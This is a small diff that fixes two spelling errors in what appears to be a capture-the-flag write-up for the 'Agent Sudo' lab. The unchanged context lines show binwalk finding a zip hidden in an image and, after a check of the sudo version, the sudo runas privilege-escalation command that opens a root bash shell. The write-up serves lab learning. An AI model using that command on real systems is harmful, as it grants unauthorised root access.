@@ -164,7 +164,7 @@ Agent C
 
 ## 4: Steganography, data extraction 1 : binwalk, john
 
-There is some trial and error here analysing the recovered files in various steg tools - for this guide, we'll stick to the happy path. Running binwalk on `cutie.png` reveals an embdedded zip archive : 
+There is some trial and error here analysing the recovered files in various steg tools - for this guide, we'll stick to the happy path. Running binwalk on `cutie.png` reveals an embedded zip archive : 
 
 ```console
 ┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
@@ -280,7 +280,7 @@ james@agent-sudo:~$ sudo -V
 Sudo version 1.8.21p2
 ```
 
-and we pass the crafed user ID from the CVE listing to `sudo -u` :
+and we pass the crafted user ID from the CVE listing to `sudo -u` :
 
 ```console
 james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
